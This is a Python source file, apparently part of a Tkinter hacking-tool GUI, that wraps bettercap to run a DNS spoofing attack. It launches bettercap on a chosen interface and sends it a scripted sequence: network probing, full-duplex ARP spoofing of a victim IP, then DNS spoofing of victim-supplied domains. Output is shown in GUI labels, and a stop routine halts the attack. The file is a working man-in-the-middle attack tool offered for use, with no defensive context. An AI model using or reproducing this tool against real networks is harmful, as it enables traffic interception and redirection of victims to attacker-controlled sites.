import subprocess
import threading
import signal
import time
import traceback
import re

from tkinter import *

def startDnsSpoofing(interface, victimIp, victimDomains, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global dnsSpoofingIsRunning, dnsSpoofingThreads, terminalLabel, errorOutputLabel

    dnsSpoofingIsRunning = False
    dnsSpoofingThreads = threading.Thread(target = lambda : dnsSpoofHub(interface, victimIp, victimDomains))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running DNS Spoofing Attack...\n\n"

    runDnsSpoofing()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopDnsSpoofing() :
    global dnsSpoofingThreads, dnsSpoofingIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping DNS Spoofing Attack...\n\n"
        dnsSpoofingIsrunning = False
        dnsSpoofingThreads.join(0)
        dnsSpoofingThreads = None

        process.send_signal(signal.SIGINT)
        process.wait()
        runBettercapThread.join(timeout=0.05)


        terminalLabel["text"] += "$ DNS Spoofing Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"

def runDnsSpoofing() :
    global dnsSpoofingThreads, dnsSpoofingIsRunning
    dnsSpoofingIsRunning = True
    dnsSpoofingThreads.start()

def dnsSpoofHub(interface, victimIp, victimDomains):
    global process, runBettercapThread

    spoofTargets = "set arp.spoof.targets " + victimIp
    spoofDomains = "set dns.spoof.domains " + victimDomains

    process = subprocess.Popen(["bettercap", "-iface", interface], 
                               stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    runBettercapThread = threading.Thread(target=reader, args=(process,))
    runBettercapThread.start()

    commands = ["help", "net.probe on", "help", "net.show", "set arp.spoof.fullduplex true",
                spoofTargets, "arp.spoof on", "set dns.spoof.all true",
                spoofDomains, "dns.spoof on"]
    for command in commands:
        terminalLabel["text"] += f"Executing command : {command}"
        process.stdin.write(f"{command}\n".encode())
        process.stdin.flush()

        # Give it some time to process the command and generate output
        time.sleep(2)

def reader(proc):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    while True:
        output = proc.stdout.readline().decode('utf8', errors='strict')
        if output == '' and proc.poll() is not None:
            terminalLabel["text"] += "\n"
            break
        if output:
            ansiStripOutput = ansi_escape.sub('', output)
            terminalLabel["text"] += "$ " + ansiStripOutput.strip() + "\n"